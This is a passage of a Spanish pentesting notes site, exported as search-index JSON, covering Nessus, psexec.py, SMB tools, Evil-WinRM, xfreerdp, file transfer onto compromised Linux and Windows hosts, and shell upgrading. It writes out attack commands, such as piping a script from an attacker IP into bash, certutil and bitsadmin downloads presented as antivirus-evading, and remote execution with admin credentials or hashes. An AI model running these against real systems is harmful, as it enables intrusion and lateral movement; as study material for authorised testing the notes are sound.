C\u00f3mo funciona?","text":"<p>1\ufe0f\u20e3 Se configura un escaneo especificando IPs o rangos de red. 2\ufe0f\u20e3 Nessus env\u00eda paquetes para identificar sistemas y servicios activos. 3\ufe0f\u20e3 Compara los resultados con su base de datos de vulnerabilidades. 4\ufe0f\u20e3 Genera un informe con el nivel de riesgo y posibles soluciones.</p>"},{"location":"tools/nessus/#casos-de-uso","title":"\ud83d\udd39 Casos de uso","text":"<p>\ud83d\udd39 Auditor\u00edas de seguridad en empresas. \ud83d\udd39 Pruebas de penetraci\u00f3n. \ud83d\udd39 Cumplimiento de normativas (PCI DSS, HIPAA, ISO 27001, etc.). \ud83d\udd39 Identificaci\u00f3n de vulnerabilidades antes de ser explotadas.</p> <p>Si te interesa probarlo, puedes descargar Nessus Essentials gratis desde Tenable. \ud83d\ude80</p>"},{"location":"tools/psexec/","title":"PSExec","text":""},{"location":"tools/psexec/#psexecpy-herramienta-para-ejecucion-remota-en-windows","title":"\ud83d\udd25 psexec.py - Herramienta para Ejecuci\u00f3n Remota en Windows \ud83d\udd25","text":"<p><code>psexec.py</code> es un script de Python que emula la funcionalidad de la herramienta PsExec de Sysinternals (ahora propiedad de Microsoft). PsExec es una herramienta muy utilizada para ejecutar comandos y programas de forma remota en sistemas Windows, especialmente \u00fatil para administradores de sistemas y en pruebas de penetraci\u00f3n.</p> <p>El script <code>psexec.py</code> permite realizar ejecuciones remotas de comandos en sistemas Windows sin necesidad de tener acceso f\u00edsico al sistema o de estar presente en la red de forma local.</p>"},{"location":"tools/psexec/#que-hace-psexecpy","title":"\ud83d\udccc \u00bfQu\u00e9 hace <code>psexec.py</code>?","text":"<p><code>psexec.py</code> es una versi\u00f3n de c\u00f3digo abierto y simplificada del comando <code>PsExec</code> y permite lo siguiente:</p> <ol> <li>Ejecuci\u00f3n remota de comandos: Puedes ejecutar comandos en una m\u00e1quina remota de Windows, similar a como lo har\u00edas con el comando <code>cmd</code> o PowerShell.</li> <li>Transferencia de archivos: Puedes transferir archivos hacia o desde la m\u00e1quina remota mientras ejecutas los comandos.</li> <li>Ejecuci\u00f3n con privilegios elevados: Al igual que PsExec, puedes ejecutar comandos con privilegios de administrador (si la cuenta tiene los permisos adecuados).</li> <li>Recopilaci\u00f3n de informaci\u00f3n: Puedes ejecutar comandos de recopilaci\u00f3n de informaci\u00f3n en una m\u00e1quina Windows remota, como obtener detalles de red, lista de procesos, etc.</li> </ol>"},{"location":"tools/psexec/#instalacion-y-requisitos","title":"\ud83d\udd39 Instalaci\u00f3n y Requisitos","text":"<p><code>psexec.py</code> suele encontrarse en repositorios de herramientas de pentesting como SecLists, Kali Linux, o en GitHub. Para ejecutarlo, necesitas tener Python instalado en tu sistema.</p> <ol> <li> <p>Instalaci\u00f3n de dependencias: Si no tienes Python, inst\u00e1lalo desde python.org.</p> </li> <li> <p>Dependencias adicionales: Algunas versiones del script pueden requerir dependencias como <code>impacket</code> para manejar la autenticaci\u00f3n y las conexiones SMB:</p> <p><code>bash pip install impacket</code></p> </li> </ol> <p>El m\u00f3dulo <code>psexec</code> de Metasploit se usa cuando tienes credenciales v\u00e1lidas de un usuario con privilegios administrativos en un sistema Windows que tiene SMB habilitado (puerto 445 abierto).</p>"},{"location":"tools/psexec/#cuando-usar-psexec-en-smb","title":"\ud83d\udccc Cu\u00e1ndo usar <code>psexec</code> en SMB","text":"<p>Debes considerar <code>psexec</code> si se cumplen las siguientes condiciones:</p> <ol> <li>Acceso SMB habilitado \u2192 El puerto <code>445</code> est\u00e1 abierto en el objetivo.</li> <li>Credenciales v\u00e1lidas \u2192 Tienes un usuario y contrase\u00f1a con privilegios administrativos.</li> <li>Permisos suficientes \u2192 El usuario debe tener permisos para ejecutar procesos remotos en el sistema.</li> <li>Servicios SMB y ADMIN$ accesibles \u2192 El servicio <code>ADMIN$</code> debe estar disponible en el sistema objetivo.</li> </ol>"},{"location":"tools/psexec/#uso-basico-de-psexecpy","title":"\ud83d\udd39 Uso B\u00e1sico de <code>psexec.py</code>","text":"<p>Para ejecutar el script, debes especificar la direcci\u00f3n IP de la m\u00e1quina remota, junto con el nombre de usuario y la contrase\u00f1a, o la clave de acceso si est\u00e1s utilizando autenticaci\u00f3n NTLM.</p>"},{"location":"tools/psexec/#sintaxis-basica","title":"Sintaxis B\u00e1sica:","text":"<pre><code>python psexec.py &lt;usuario&gt;:&lt;contrase\u00f1a&gt;@&lt;IP objetivo&gt; &lt;comando a ejecutar&gt;\n</code></pre>"},{"location":"tools/psexec/#ejemplo","title":"Ejemplo:","text":"<p>Si quieres ejecutar el comando <code>ipconfig</code> en la m\u00e1quina remota con la IP <code>192.168.1.100</code>, usa:</p> <pre><code>python psexec.py administrator:password@192.168.1.100 ipconfig\n</code></pre> <p>Esto ejecutar\u00e1 <code>ipconfig</code> en la m\u00e1quina remota y te devolver\u00e1 el resultado.</p>"},{"location":"tools/psexec/#caracteristicas-y-opciones-comunes","title":"\ud83d\udd39 Caracter\u00edsticas y Opciones Comunes","text":"Opci\u00f3n Descripci\u00f3n <code>&lt;usuario&gt;:&lt;contrase\u00f1a&gt;</code> Nombre de usuario y contrase\u00f1a para autenticarte en el sistema remoto. <code>&lt;IP objetivo&gt;</code> Direcci\u00f3n IP del sistema remoto en el que deseas ejecutar el comando. <code>&lt;comando&gt;</code> El comando o script que deseas ejecutar de manera remota. <code>-hashes</code> Si se usa autenticaci\u00f3n NTLM, puedes especificar los hashes en lugar de la contrase\u00f1a."},{"location":"tools/psexec/#ejemplo-de-ejecucion-remota-de-comandos","title":"\ud83d\udd39 Ejemplo de Ejecuci\u00f3n Remota de Comandos","text":"<ol> <li> <p>Ejecuci\u00f3n de un Comando Simple:</p> <p><code>bash python psexec.py admin:password@192.168.1.100 whoami</code></p> <p>Esto ejecutar\u00e1 el comando <code>whoami</code> en la m\u00e1quina remota para obtener el usuario actual.</p> </li> <li> <p>Transferir Archivos a una M\u00e1quina Remota: Puedes usar <code>psexec.py</code> para copiar un archivo desde tu m\u00e1quina local a una m\u00e1quina remota:</p> <p><code>bash python psexec.py admin:password@192.168.1.100 -c /ruta/a/archivo.exe</code></p> <p>El comando anterior copiar\u00e1 el archivo <code>archivo.exe</code> a la m\u00e1quina remota y lo ejecutar\u00e1.</p> </li> </ol>"},{"location":"tools/psexec/#para-que-se-utiliza-psexecpy","title":"\ud83d\udd39 \u00bfPara qu\u00e9 se utiliza <code>psexec.py</code>?","text":"<p><code>psexec.py</code> es muy \u00fatil en entornos de pruebas de penetraci\u00f3n, auditor\u00edas de seguridad y administraci\u00f3n remota, ya que:</p> <ol> <li>Ejecuci\u00f3n Remota de Comandos: Permite ejecutar casi cualquier comando en un sistema Windows remoto.</li> <li>Tareas de Administraci\u00f3n de Sistemas: Ideal para administradores de sistemas que necesitan gestionar m\u00e1quinas remotas sin necesidad de acceder f\u00edsicamente a ellas.</li> <li>Exploits y Pentesting: Durante pruebas de penetraci\u00f3n, se puede utilizar <code>psexec.py</code> para ejecutar exploits o scripts maliciosos en sistemas comprometidos.</li> </ol>"},{"location":"tools/psexec/#conclusion","title":"\ud83d\udd25 Conclusi\u00f3n","text":"<p><code>psexec.py</code> es una herramienta potente para la ejecuci\u00f3n remota de comandos en m\u00e1quinas Windows. Si bien es \u00fatil para administradores de sistemas, tambi\u00e9n es ampliamente utilizada en pruebas de penetraci\u00f3n para explotar vulnerabilidades en sistemas Windows sin necesidad de acceso f\u00edsico a la m\u00e1quina.</p>"},{"location":"tools/smbclient/","title":"SMBClient","text":"<p><code>smbclient</code> es una herramienta de l\u00ednea de comandos que permite conectarse a recursos compartidos de [[Server Message Block (SMB)]], el protocolo utilizado en redes Windows para compartir archivos e impresoras.</p>"},{"location":"tools/smbclient/#instalacion","title":"\ud83d\udccc Instalaci\u00f3n","text":"<p>Si no tienes <code>smbclient</code> instalado, puedes instalarlo en Linux con:</p> <ul> <li> <p>Debian/Ubuntu:</p> <p><code>sudo apt update &amp;&amp; sudo apt install smbclient</code></p> </li> <li> <p>Arch Linux:</p> <p><code>sudo pacman -S smbclient</code></p> </li> <li> <p>Fedora:</p> <p><code>sudo dnf install samba-client</code></p> </li> <li> <p>MacOS (Homebrew):</p> <p><code>brew install samba</code></p> </li> </ul>"},{"location":"tools/smbmap/","title":"SMBMap","text":"<p>[[smbmap]] es una herramienta de enumeraci\u00f3n y explotaci\u00f3n de recursos compartidos en redes que usan el protocolo SMB (Server Message Block). Se utiliza principalmente en auditor\u00edas de seguridad y pruebas de penetraci\u00f3n para detectar configuraciones d\u00e9biles o incorrectas en servidores SMB.</p>"},{"location":"tools/smbmap/#para-que-sirve","title":"\ud83d\udccc \u00bfPara qu\u00e9 sirve?","text":"<p><code>SMBMap</code> permite a los atacantes o pentesters:</p> <ul> <li>Enumerar recursos compartidos en un servidor SMB.</li> <li>Identificar permisos de acceso (lectura, escritura, ejecuci\u00f3n) en los recursos compartidos.</li> <li>Listar y descargar archivos accesibles.</li> <li>Subir archivos si el servidor lo permite.</li> <li>Ejecutar comandos de manera remota en servidores Windows (si se tienen las credenciales adecuadas).</li> </ul>"},{"location":"tools/smbmap/#instalacion","title":"\u2699 Instalaci\u00f3n","text":"<p>En Kali Linux y otras distribuciones enfocadas en seguridad, <code>smbmap</code> suele venir preinstalado. Si no lo tienes, puedes instalarlo con:</p> <pre><code>sudo apt install smbmap\n</code></pre> <p>O clonarlo desde su repositorio en GitHub:</p> <pre><code>git clone https://github.com/ShawnDEvans/smbmap.git\ncd smbmap\npip3 install -r requirements.txt\n</code></pre>"},{"location":"tools/winrm/","title":"WinRM","text":"<p>Evil-WinRM es una herramienta de post-explotaci\u00f3n dise\u00f1ada para facilitar la interacci\u00f3n remota con sistemas Windows mediante el servicio Windows Remote Management (WinRM). WinRM es un protocolo de Microsoft que permite la administraci\u00f3n remota de m\u00e1quinas Windows, y Evil-WinRM es un cliente de l\u00ednea de comandos que permite ejecutar comandos en un sistema remoto a trav\u00e9s de WinRM.</p> <p>Esta herramienta es particularmente \u00fatil en entornos de pruebas de penetraci\u00f3n (pentesting) y auditor\u00edas de seguridad, ya que facilita la obtenci\u00f3n de acceso remoto a un sistema Windows, especialmente despu\u00e9s de haber explotado una vulnerabilidad o de haber obtenido credenciales v\u00e1lidas.</p>"},{"location":"tools/winrm/#caracteristicas-principales-de-evil-winrm","title":"Caracter\u00edsticas principales de Evil-WinRM:","text":"<ol> <li> <p>Conexi\u00f3n a m\u00e1quinas Windows a trav\u00e9s de WinRM:</p> <ul> <li>Evil-WinRM permite realizar conexiones remotas a un sistema Windows utilizando el protocolo WinRM, que generalmente est\u00e1 habilitado en sistemas Windows por defecto, especialmente en versiones de servidor o en configuraciones de administraci\u00f3n remota.</li> <li> <p>Autenticaci\u00f3n NTLM y Kerberos:</p> </li> <li> <p>Soporta autenticaci\u00f3n utilizando NTLM y Kerberos, lo que le permite interactuar con sistemas que utilizan estas formas de autenticaci\u00f3n.</p> </li> <li> <p>Ejecutar comandos remotos:</p> </li> <li> <p>Despu\u00e9s de una conexi\u00f3n exitosa, Evil-WinRM te permite ejecutar comandos y scripts directamente en el sistema remoto como si estuvieras en una terminal local.</p> </li> <li> <p>Uso de PowerShell:</p> </li> <li> <p>Puedes ejecutar comandos de PowerShell a trav\u00e9s de la conexi\u00f3n remota, lo cual es muy \u00fatil ya que PowerShell es una herramienta poderosa para interactuar con sistemas Windows y realizar tareas administrativas.</p> </li> <li> <p>Reconocimiento de sistemas:</p> </li> <li> <p>La herramienta tambi\u00e9n puede ser \u00fatil para explorar el sistema y realizar tareas como obtener informaci\u00f3n sobre los usuarios, listar directorios, ver procesos en ejecuci\u00f3n, etc.</p> </li> </ul> </li> </ol>"},{"location":"tools/winrm/#ejemplo-de-uso-basico","title":"Ejemplo de uso b\u00e1sico:","text":"<p>Para utilizar Evil-WinRM, necesitar\u00e1s la direcci\u00f3n IP del objetivo, as\u00ed como las credenciales (usuario y contrase\u00f1a). Un comando b\u00e1sico para conectarte a un sistema remoto ser\u00eda:</p> <pre><code>evil-winrm -i &lt;ip_del_objetivo&gt; -u &lt;usuario&gt; -p &lt;contrase\u00f1a&gt;\n</code></pre> <ul> <li><code>-i &lt;ip_del_objetivo&gt;</code>: Direcci\u00f3n IP del sistema Windows al que deseas conectarte.</li> <li><code>-u &lt;usuario&gt;</code>: Nombre de usuario para la autenticaci\u00f3n.</li> <li><code>-p &lt;contrase\u00f1a&gt;</code>: Contrase\u00f1a asociada con el usuario.</li> </ul>"},{"location":"tools/winrm/#funcionalidad-adicional","title":"Funcionalidad adicional:","text":"<p>Evil-WinRM tambi\u00e9n soporta otras opciones avanzadas, como:</p> <ul> <li>T\u00faneles HTTPS: Para conexiones cifradas, puedes usar la opci\u00f3n <code>-s</code> para habilitar un t\u00fanel seguro.</li> <li>Soporte para sesiones interactivas: Puedes interactuar con el sistema en una terminal que te permitir\u00e1 ejecutar comandos de manera continua durante una sesi\u00f3n.</li> <li>Ejecutar PowerShell o comandos CMD remotos.</li> </ul>"},{"location":"tools/winrm/#contexto-de-uso","title":"Contexto de uso:","text":"<ul> <li>Pruebas de penetraci\u00f3n: Evil-WinRM es com\u00fanmente utilizado por pentesters y auditores de seguridad para realizar pruebas de penetraci\u00f3n, especialmente despu\u00e9s de haber comprometido un sistema Windows.</li> <li>Explotaci\u00f3n post-explotaci\u00f3n: Tras obtener acceso inicial al sistema (por ejemplo, a trav\u00e9s de una vulnerabilidad de escalada de privilegios o por medio de credenciales robadas), Evil-WinRM se puede usar para mantener el acceso o realizar movimientos laterales dentro de la red.</li> </ul>"},{"location":"tools/xfreerdp/","title":"XfreeRDP","text":"<p>[[xfreerdp\ud83e\ude9f]] es una implementaci\u00f3n de c\u00f3digo abierto del protocolo [[RDP (Remote Desktop Protocol)]], que permite a los usuarios conectarse de forma remota a m\u00e1quinas Windows o servidores que soporten este protocolo. Es parte del proyecto FreeRDP, que ofrece una alternativa libre y gratuita a las herramientas de escritorio remoto propietarias, como el cliente de Escritorio Remoto de Microsoft.</p>"},{"location":"tools/xfreerdp/#caracteristicas-principales-de-xfreerdp","title":"Caracter\u00edsticas principales de xfreerdp:","text":"<ol> <li>Multiplataforma: Funciona en sistemas operativos como Linux, macOS y Windows.</li> <li>Soporte para RDP avanzado: Incluye caracter\u00edsticas como soporte para gr\u00e1ficos avanzados, redirecci\u00f3n de dispositivos (impresoras, discos, etc.), y sonido.</li> <li>Flexibilidad: Permite personalizar la conexi\u00f3n con m\u00faltiples opciones de l\u00ednea de comandos.</li> <li>Seguridad: Soporta cifrado y autenticaci\u00f3n avanzada, como NLA (Network Level Authentication).</li> </ol>"},{"location":"tools/xfreerdp/#uso-basico","title":"Uso b\u00e1sico:","text":"<p>Para conectarse a un servidor remoto usando xfreerdp, puedes usar un comando como este:</p> <pre><code>xfreerdp /v:&lt;direcci\u00f3n_ip&gt; /u:&lt;usuario&gt; /p:&lt;contrase\u00f1a&gt;\n</code></pre> <ul> <li><code>/v:</code> especifica la direcci\u00f3n IP o el nombre del servidor.</li> <li><code>/u:</code> define el nombre de usuario.</li> <li><code>/p:</code> indica la contrase\u00f1a.</li> </ul>"},{"location":"tools/xfreerdp/#ejemplo","title":"Ejemplo:","text":"<pre><code>xfreerdp /v:192.168.1.100 /u:Administrador /p:micontrase\u00f1a\n</code></pre>"},{"location":"tools/xfreerdp/#opciones-adicionales","title":"Opciones adicionales:","text":"<ul> <li><code>/size:</code> para definir la resoluci\u00f3n de la pantalla (ejemplo: <code>/size:1280x1024</code>).</li> <li><code>/sound:</code> para habilitar el sonido.</li> <li><code>/clipboard:</code> para habilitar el uso compartido del portapapeles.</li> </ul> <p>xfreerdp es una herramienta potente y vers\u00e1til para administrar conexiones remotas en entornos profesionales o personales.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/","title":"Transferring Files To Linux","text":""},{"location":"transferring-files/linux/transferring-files-to-linux/#metodos-para-transferir-archivos-desde-la-maquina-atacante-a-un-linux-comprometido","title":"\ud83d\udccc M\u00e9todos para Transferir Archivos desde la M\u00e1quina Atacante a un Linux Comprometido","text":"<p>Si tienes acceso a una m\u00e1quina Linux comprometida, puedes transferir archivos de diferentes maneras seg\u00fan las herramientas disponibles.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#1-usando-wget-o-curl-rapido-y-sencillo","title":"\ud83d\udd39 1\ufe0f\u20e3 Usando <code>wget</code> o <code>curl</code> (R\u00e1pido y Sencillo)","text":"<p>Si <code>wget</code> o <code>curl</code> est\u00e1n disponibles en la v\u00edctima, puedes descargar archivos desde tu m\u00e1quina atacante.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-victima-linux","title":"Desde la m\u00e1quina v\u00edctima (Linux)","text":"<pre><code>wget http://TU_IP/archivo.sh -O archivo.sh\n</code></pre> <p>\ud83d\udd39 Alternativa con <code>curl</code>:</p> <pre><code>curl -o archivo.sh http://TU_IP/archivo.sh\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-atacante-kalilinux","title":"Desde la m\u00e1quina atacante (Kali/Linux)","text":"<p>Inicia un servidor HTTP para compartir archivos:</p> <pre><code>python3 -m http.server 80\n</code></pre> <p>\ud83d\udd39 Luego, la v\u00edctima ejecuta <code>wget</code> o <code>curl</code> para descargar el archivo o ejecutarlo.</p> <pre><code>curl http://10.10.14.24/linpeas.sh | bash\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#2-usando-scp-si-tienes-acceso-ssh","title":"\ud83d\udd39 2\ufe0f\u20e3 Usando SCP (Si tienes acceso SSH)","text":"<p>Si puedes conectarte por SSH, puedes usar <code>scp</code> para transferir archivos.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-atacante-linuxkali","title":"Desde la m\u00e1quina atacante (Linux/Kali)","text":"<pre><code>scp archivo.sh usuario@IP_VICTIMA:/tmp/archivo.sh\n</code></pre> <p>\ud83d\udd39 Si el puerto SSH es diferente al predeterminado (22):</p> <pre><code>scp -P 2222 archivo.sh usuario@IP_VICTIMA:/tmp/archivo.sh\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#3-netcat-nc-metodo-rapido","title":"\ud83d\udd39 3\ufe0f\u20e3 Netcat (<code>nc</code>) - M\u00e9todo R\u00e1pido","text":"<p>Si <code>nc</code> est\u00e1 disponible en la v\u00edctima, puedes enviar archivos f\u00e1cilmente.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-victima-linux_1","title":"Desde la m\u00e1quina v\u00edctima (Linux)","text":"<pre><code>nc -lvnp 4444 &gt; archivo.sh\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-atacante-kalilinux_1","title":"Desde la m\u00e1quina atacante (Kali/Linux)","text":"<pre><code>nc IP_VICTIMA 4444 &lt; archivo.sh\n</code></pre> <p>\ud83d\udd39 Esto enviar\u00e1 <code>archivo.sh</code> desde la atacante a la v\u00edctima a trav\u00e9s de Netcat.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#4-transferencia-con-smb-si-la-victima-puede-montar-smb","title":"\ud83d\udd39 4\ufe0f\u20e3 Transferencia con SMB (Si la v\u00edctima puede montar SMB)","text":"<p>Si la v\u00edctima puede conectarse a un recurso compartido SMB, puedes usar <code>impacket-smbserver</code>.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-atacante-kali","title":"Desde la m\u00e1quina atacante (Kali)","text":"<pre><code>impacket-smbserver share $(pwd) -smb2support\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-victima-linux_2","title":"Desde la m\u00e1quina v\u00edctima (Linux)","text":"<pre><code>mkdir /mnt/smb\nmount -t cifs //TU_IP/share /mnt/smb -o guest\ncp /mnt/smb/archivo.sh /tmp/\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#5-usando-ftp-si-la-victima-tiene-ftp-instalado","title":"\ud83d\udd39 5\ufe0f\u20e3 Usando FTP (Si la v\u00edctima tiene <code>ftp</code> instalado)","text":"<p>Si <code>ftp</code> est\u00e1 disponible en la v\u00edctima, puedes configurar un servidor FTP en la m\u00e1quina atacante.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-atacante-kali_1","title":"Desde la m\u00e1quina atacante (Kali)","text":"<p>Inicia un servidor FTP con acceso an\u00f3nimo:</p> <pre><code>sudo python3 -m pyftpdlib -p 21\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-victima-linux_3","title":"Desde la m\u00e1quina v\u00edctima (Linux)","text":"<pre><code>ftp TU_IP\nbinary\nget archivo.sh\nbye\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#6-transferencia-con-rsync-si-esta-disponible","title":"\ud83d\udd39 6\ufe0f\u20e3 Transferencia con <code>rsync</code> (Si est\u00e1 disponible)","text":"<p>Si <code>rsync</code> est\u00e1 instalado en la v\u00edctima, puedes usarlo para transferir archivos.</p>"},{"location":"transferring-files/linux/transferring-files-to-linux/#desde-la-maquina-atacante-linuxkali_1","title":"Desde la m\u00e1quina atacante (Linux/Kali)","text":"<pre><code>rsync -avz archivo.sh usuario@IP_VICTIMA:/tmp/\n</code></pre>"},{"location":"transferring-files/linux/transferring-files-to-linux/#conclusion","title":"\ud83d\ude80 Conclusi\u00f3n","text":"<ul> <li>Si <code>wget</code> o <code>curl</code> est\u00e1n disponibles, \u00fasalos con un servidor HTTP.</li> <li>Si tienes acceso SSH, usa <code>scp</code> o <code>rsync</code>.</li> <li>Si la v\u00edctima tiene <code>nc</code>, usa Netcat.</li> <li>Si la v\u00edctima puede acceder a SMB o FTP, comp\u00e1rtelos desde la m\u00e1quina atacante.</li> </ul>"},{"location":"transferring-files/windows/transferring-files-to-windows/","title":"Transferring Files To Windows","text":""},{"location":"transferring-files/windows/transferring-files-to-windows/#metodos-para-transferir-archivos-a-un-windows-comprometido","title":"\ud83d\udccc M\u00e9todos para Transferir Archivos a un Windows Comprometido","text":"<p>Si tienes acceso a un sistema Windows comprometido, puedes transferir archivos de diferentes maneras dependiendo de las herramientas disponibles y las restricciones del sistema.</p>"},{"location":"transferring-files/windows/transferring-files-to-windows/#1-powershell-recomendado","title":"\ud83d\udd39 1\ufe0f\u20e3 PowerShell (Recomendado)","text":"<p>Si PowerShell est\u00e1 disponible, puedes descargar archivos desde tu m\u00e1quina atacante con este comando:</p> <pre><code>Invoke-WebRequest -Uri \"http://TU_IP/archivo.exe\" -OutFile \"C:\\Users\\Public\\archivo.exe\"\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n:</p> <ul> <li><code>Invoke-WebRequest</code> descarga el archivo desde tu servidor.</li> <li><code>-Uri</code> especifica la URL del archivo en tu m\u00e1quina atacante.</li> <li><code>-OutFile</code> define d\u00f3nde guardar el archivo en la m\u00e1quina v\u00edctima.</li> </ul>"},{"location":"transferring-files/windows/transferring-files-to-windows/#alternativa-con-curl-en-powershell-30","title":"\ud83d\udd39 Alternativa con <code>curl</code> en PowerShell 3.0+","text":"<pre><code>curl -o C:\\Users\\Public\\archivo.exe http://TU_IP/archivo.exe\n</code></pre> <p>\ud83d\udd39 C\u00f3mo iniciar un servidor en la m\u00e1quina atacante (Kali/Linux):</p> <pre><code>python3 -m http.server 80\n</code></pre> <p>\ud83d\udd39 Luego accede desde la v\u00edctima con PowerShell.</p>"},{"location":"transferring-files/windows/transferring-files-to-windows/#2-certutil-si-powershell-esta-bloqueado","title":"\ud83d\udd39 2\ufe0f\u20e3 CertUtil (Si PowerShell est\u00e1 bloqueado)","text":"<pre><code>certutil -urlcache -split -f \"http://TU_IP/archivo.exe\" \"C:\\Users\\Public\\archivo.exe\"\n</code></pre> <p>\ud83d\udd39 <code>certutil</code> es una herramienta integrada en Windows que permite descargar archivos sin activar alarmas en algunos antivirus.</p>"},{"location":"transferring-files/windows/transferring-files-to-windows/#3-ftp-si-tienes-un-servidor-ftp-configurado","title":"\ud83d\udd39 3\ufe0f\u20e3 FTP (Si tienes un servidor FTP configurado)","text":"<p>Desde la v\u00edctima:</p> <pre><code>ftp TU_IP\n</code></pre> <ul> <li>Introducir usuario y contrase\u00f1a (si aplica).</li> <li>Luego ejecutar:</li> </ul> <pre><code>binary\nget archivo.exe\n</code></pre> <ul> <li>Finalmente, salir con <code>bye</code>.</li> </ul> <p>\ud83d\udd39 C\u00f3mo iniciar un servidor FTP en Kali:</p> <pre><code>sudo python3 -m pyftpdlib -p 21\n</code></pre>"},{"location":"transferring-files/windows/transferring-files-to-windows/#4-smb-si-el-firewall-permite-trafico-smb","title":"\ud83d\udd39 4\ufe0f\u20e3 SMB (Si el firewall permite tr\u00e1fico SMB)","text":"<p>Desde la m\u00e1quina atacante (Kali):</p> <pre><code>impacket-smbserver share $(pwd) -smb2support\n</code></pre> <p>\ud83d\udd39 Luego, en Windows v\u00edctima:</p> <pre><code>net use Z: \\\\TU_IP\\share\ncopy Z:\\archivo.exe C:\\Users\\Public\\\n</code></pre>"},{"location":"transferring-files/windows/transferring-files-to-windows/#5-uso-de-nc-netcat","title":"\ud83d\udd39 5\ufe0f\u20e3 Uso de <code>nc</code> (Netcat)","text":"<p>Si <code>nc</code> est\u00e1 disponible en Windows, desde la m\u00e1quina atacante:</p> <pre><code>nc -lvnp 4444 &lt; archivo.exe\n</code></pre> <p>Luego, en la v\u00edctima (Windows):</p> <pre><code>nc TU_IP 4444 &gt; archivo.exe\n</code></pre>"},{"location":"transferring-files/windows/transferring-files-to-windows/#6-descarga-con-bitsadmin-si-certutil-esta-bloqueado","title":"\ud83d\udd39 6\ufe0f\u20e3 Descarga con BitsAdmin (Si <code>certutil</code> est\u00e1 bloqueado)","text":"<pre><code>bitsadmin /transfer myJob /download /priority high http://TU_IP/archivo.exe C:\\Users\\Public\\archivo.exe\n</code></pre> <p>\ud83d\udd39 <code>BitsAdmin</code> es una utilidad de Windows para manejar descargas en segundo plano.</p>"},{"location":"transferring-files/windows/transferring-files-to-windows/#conclusion","title":"\ud83d\ude80 Conclusi\u00f3n","text":"<p>Si tienes PowerShell, usa <code>Invoke-WebRequest</code>. Si PowerShell est\u00e1 bloqueado, usa <code>certutil</code>. Si necesitas algo m\u00e1s sigiloso, usa SMB o FTP.</p>"},{"location":"upgrading-non-interactive-shells/linux/upgrading-non-interactive-shell-linux/","title":"Upgrading Non-Interactive Shell Linux","text":"<p>Para Linux, cuando hablamos de \"upgradear\" una shell no interactiva, generalmente nos referimos a t\u00e9cnicas que convierten una shell limitada o sin caracter\u00edsticas de interacci\u00f3n (como no poder usar teclas de edici\u00f3n, el historial de comandos o tener un terminal completamente funcional) en una shell interactiva completa que permite una mayor flexibilidad para ejecutar comandos.</p>"},{"location":"upgrading-non-interactive-shells/linux/upgrading-non-interactive-shell-linux/#metodos-comunes-para-upgradear-una-shell-no-interactiva-en-linux","title":"\ud83d\udccc M\u00e9todos Comunes para Upgradear una Shell No Interactiva en Linux:","text":"<ol> <li> <p>Usar <code>python</code> para obtener una shell interactiva Si tienes acceso a Python en la v\u00edctima, puedes usarlo para invocar una shell interactiva. Este es uno de los m\u00e9todos m\u00e1s utilizados debido a su simplicidad y disponibilidad en la mayor\u00eda de las distribuciones de Linux.</p> <p><code>bash python -c 'import pty; pty.spawn(\"/bin/bash\")'</code></p> <p>\ud83d\udd39 Explicaci\u00f3n: Este comando crea un proceso interactivo de Bash usando el m\u00f3dulo <code>pty</code> de Python. Esto te da una shell completa que puedes usar como si estuvieras en un terminal normal.</p> </li> <li> <p>Usar <code>bash</code> con la opci\u00f3n <code>-i</code> Si tienes una shell de Bash que no es interactiva (por ejemplo, que no permite el uso de teclas de flechas o el historial de comandos), puedes invocar una nueva instancia de Bash en modo interactivo.</p> <p><code>bash /bin/bash -i</code></p> <p>\ud83d\udd39 Explicaci\u00f3n: El par\u00e1metro <code>-i</code> le indica a Bash que debe ejecutarse en modo interactivo, lo que habilita caracter\u00edsticas como el historial de comandos y el uso de las teclas de edici\u00f3n.</p> </li> <li> <p>Usar <code>stty</code> y <code>fg</code> para mejorar la terminal A veces, una shell puede no estar completamente interactiva porque no tiene configuraciones de terminal adecuadas. Usando <code>stty</code> y <code>fg</code>, puedes intentar mejorar la entrada/salida del terminal.</p> <p><code>bash stty raw -echo; fg</code></p> <p>\ud83d\udd39 Explicaci\u00f3n:</p> <ul> <li><code>stty raw -echo</code>: Esto pone el terminal en modo \"raw\" y desactiva el eco, lo que significa que puedes escribir comandos sin que se muestren en pantalla.</li> <li><code>fg</code>: Trae el trabajo en segundo plano a primer plano, lo que puede restaurar la capacidad de interactuar con el shell de manera normal.</li> <li>Uso de <code>script</code> para obtener una shell interactiva El comando <code>script</code> puede ser usado para crear una shell interactiva.</li> </ul> <p><code>bash script /dev/null</code></p> <p>\ud83d\udd39 Explicaci\u00f3n: El comando <code>script</code> te permite crear un registro de una sesi\u00f3n interactiva, y si se usa sin especificar un archivo de salida, como en este caso con <code>/dev/null</code>, puedes obtener una shell interactiva en la v\u00edctima.</p> </li> <li> <p>Manipulaci\u00f3n del terminal con <code>reset</code> Si la terminal parece estar \"rota\" o deshabilitada (por ejemplo, sin mostrar las teclas de edici\u00f3n o sin permitir una interacci\u00f3n fluida), puedes intentar restablecer el terminal.</p> <p><code>bash reset</code></p> <p>\ud83d\udd39 Explicaci\u00f3n: El comando <code>reset</code> intenta restaurar la configuraci\u00f3n predeterminada de la terminal, lo que a veces mejora la interactividad.</p> </li> <li> <p>Usar <code>nc</code> (Netcat) para obtener acceso interactivo Si tienes <code>nc</code> (Netcat) disponible, puedes usarlo para enviar comandos a trav\u00e9s de una conexi\u00f3n de red, lo que 